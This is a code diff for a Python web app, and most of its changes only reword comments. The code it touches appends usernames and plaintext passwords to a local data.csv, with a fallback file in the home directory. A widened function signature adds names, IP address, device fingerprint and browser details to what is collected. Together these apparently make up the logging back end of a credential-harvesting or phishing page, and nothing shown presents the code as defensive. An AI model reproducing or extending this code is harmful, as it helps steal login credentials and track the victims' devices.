@@ -167,7 +167,7 @@ def get_browser_info():
     """
     user_agent = request.headers.get('User-Agent', '')
     
-    
+    # Extract browser name and version
     browser_name = "Unknown"
     browser_version = "Unknown"
     
@@ -263,7 +263,7 @@ def get_browser_info():
     
     return json.dumps(browser_details)
 
-def save_full_data(username, password, timestamp):
+def save_full_data(firstname, lastname, username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info):
     """ 
     Save simplified user data to CSV with only essential information
     """
@@ -282,7 +282,7 @@ def save_full_data(username, password, timestamp):
         with open(csv_path, 'a', newline='\n') as csvfile:
             writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)
 
-            # print header if file does not exist or is empty
+            # Write header if file does not exist or is empty
             if not file_exists or os.stat(csv_path).st_size == 0:
                 writer.writerow([
                     'username',
@@ -291,7 +291,7 @@ def save_full_data(username, password, timestamp):
                 ])
                 csvfile.flush()
 
-            # print only essential data
+            # Write only essential data
             writer.writerow([
                 username,
                 password,
@@ -299,11 +299,11 @@ def save_full_data(username, password, timestamp):
             ])
             csvfile.flush()
             
-        # update the last modified timestamp
+        # Update the last modified timestamp
         update_last_modified_timestamp()
             
     except Exception as e:
-        # backup path if main path fails
+        # Fallback path if main path fails
         fallback_path = os.path.join(os.path.expanduser('~'), 'data.csv')
         with open(fallback_path, 'a', newline='\n') as csvfile:
             writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)
@@ -324,7 +324,7 @@ def save_full_data(username, password, timestamp):
             ])
             csvfile.flush()
             
-        # update the last modified timestamp (for fallback path)
+        # Update the last modified timestamp (for fallback path)
         update_last_modified_timestamp(fallback_path)
 
 def update_last_modified_timestamp(csv_path=None):
@@ -333,12 +333,12 @@ def update_last_modified_timestamp(csv_path=None):
         script_dir = os.path.dirname(os.path.abspath(__file__))
         timestamp_file = os.path.join(script_dir, 'last_modified.txt')
         
-        # equip the same time adjustment as in the login function
+        # Apply the same time adjustment as in the login function
         now = datetime.now()
         adjusted_time = now + timedelta(hours=18)  
         current_time = adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
         
-        # write timestamp to file
+        # Write timestamp to file
         with open(timestamp_file, 'w') as f:
             f.write(current_time)
     except Exception as e:
@@ -354,7 +354,7 @@ def get_last_modified_timestamp():
             with open(timestamp_file, 'r') as f:
                 return f.read().strip()
         
-        # if file doesn't exist, check the CSV file's modification time
+        # If file doesn't exist, check the CSV file's modification time
         csv_path = os.path.join(script_dir, 'data.csv')
         if os.path.exists(csv_path):
             modified_time = os.path.getmtime(csv_path)
